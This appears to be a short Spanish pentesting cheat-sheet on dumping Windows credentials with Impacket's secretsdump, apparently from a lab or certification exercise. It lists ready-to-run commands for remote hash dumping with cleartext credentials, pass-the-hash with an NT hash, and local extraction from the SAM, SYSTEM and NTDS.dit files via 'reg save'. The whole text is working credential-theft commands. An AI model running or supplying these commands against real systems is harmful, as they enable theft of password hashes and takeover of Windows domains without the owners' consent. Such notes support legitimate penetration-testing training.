En remoto (muy util)

SAM hashes (uid:rid:lmhash:nthash)

Para dumpear solo la sam:

Para dumpear todas las contraseñas:
```
secretsdump.py  'medtech.com/yoshi:Mushroom!@172.16.122.82'
```

![[Pasted image 20230406203551.png]]

* PPH
```
secretsdump.py  'EXTERNAL/Administrator@192.168.166.247' -hashes 'aad3b435b51404eeaad3b435b51404ee:2f2b8d5d4d756a2c72c554580f970c14'

```
Muy util los cache logon


En local la podemos encontrar en:

```
\Windows\System32\SAM
\Windows\System32\SYSTEM


impacket-secretsdump -system system -sam sam
```


# DUMPING NTDS

`reg save HKLM\system system

impacket-secretsdump -system system -ntds ntds.dit LOCAL


Se puede ejecutar en remoto si se tienen permisos